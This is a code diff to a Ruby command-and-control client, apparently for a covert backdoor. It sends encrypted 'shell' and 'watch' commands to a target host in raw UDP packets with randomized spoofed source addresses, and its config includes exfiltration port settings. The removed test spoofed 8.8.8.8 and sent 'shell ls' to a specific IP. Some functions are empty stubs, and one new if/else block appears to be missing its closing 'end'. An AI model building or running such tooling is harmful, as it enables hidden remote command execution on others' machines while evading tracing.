@@ -25,6 +25,7 @@
 require 'packetfu'
 require 'openssl'
 require 'readline'
+require 'ipaddress'
 require_relative 'util.rb'
 
 ## Variables
@@ -37,6 +38,7 @@ CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
 CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
 CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
 CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
+CONFIG_FILE_DEFAULT << "\# target_ip = 8.8.8.8\n"
 CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
 CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
 CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
@@ -45,32 +47,18 @@ INPUT_REGEX = /^(shell|watch) .+$/
 
 ## Functions
 
-def udp_test
-  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> IF_DEV)).config
-  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
-
-
-  #udp_pkt.eth_saddr = 
-  #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8
-  udp_pkt.udp_dst = 8668
-  udp_pkt.udp_src = rand(0xffff)
-  udp_pkt.ip_saddr = "8.8.8.8"
-  udp_pkt.ip_daddr = "142.232.107.31"
-  udp_pkt.payload = encrypt("#{AUTH_STRING} shell ls")
-  #check that commands have at least 3 split by space, sanitize inputs?
-  #udp_pkt.payload = "hello this is a test"
-  puts udp_pkt.payload.length
-
-  udp_pkt.recalc
-  udp_pkt.to_w "em1"
-end
-
 def listen_for_knock
   
 end
 
 def start_receiving_server
   
+end
+
+def validate_target_ip
+  if !IPAddress.valid_ipv4?(@cfg_target_ip)
+    exit_reason("Invalid target ip address")
+  end
 end
 
 def start_command_loop
@@ -82,7 +70,7 @@ def start_command_loop
     loop {
       input = Readline.readline('> ', true)  
       if input.match(INPUT_REGEX)
-        send_pkt_server_async(input[5..-1].strip)
+        send_pkt_server_async(input.strip)
       else
         puts "Incorrect command format"
       end
@@ -93,15 +81,38 @@ def start_command_loop
 end
 
 def send_pkt_server_async(command)
-  puts "cmd recv: \"#{command}\""
-  
+  if @cfg_pen_protocol == TCP
+    # handle TCP here
+  elsif @cfg_pen_protocol == UDP
+    payload = "#{AUTH_STRING} #{command}"
+    if payload.match(PAYLOAD_REGEX)
+      udp_packet(payload)
+    else
+      exit_reason("Error with payload validation")
+  end
+end
+
+def udp_packet(payload)
+  config = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface=> @cfg_iface)).config
+  udp_pkt = PacketFu::UDPPacket.new(:config => config, :flavor => "Linux")
+
+
+  #udp_pkt.eth_saddr = 
+  #udp_pkt.eth_daddr = b8:ac:6f:34:ad:d8 may not be needed
+  udp_pkt.udp_dst = @cfg_pen_port
+  udp_pkt.udp_src = rand(0xffff)
+  #udp_pkt.ip_saddr = "8.8.8.8"
+  udp_pkt.ip_saddr = [rand(0xff),rand(0xff),rand(0xff),rand(0xff)].join('.')
+  udp_pkt.ip_daddr = @cfg_target_ip
+  udp_pkt.payload = encrypt(payload)
+
+  udp_pkt.recalc
+  udp_pkt.to_w(@cfg_iface)
 end
 
 ## Main
 
-#load config
 load_config_file
-
+validate_target_ip
 puts "+ Welcome to \"not a hacking\" program"
-#prompt for input
 start_command_loop
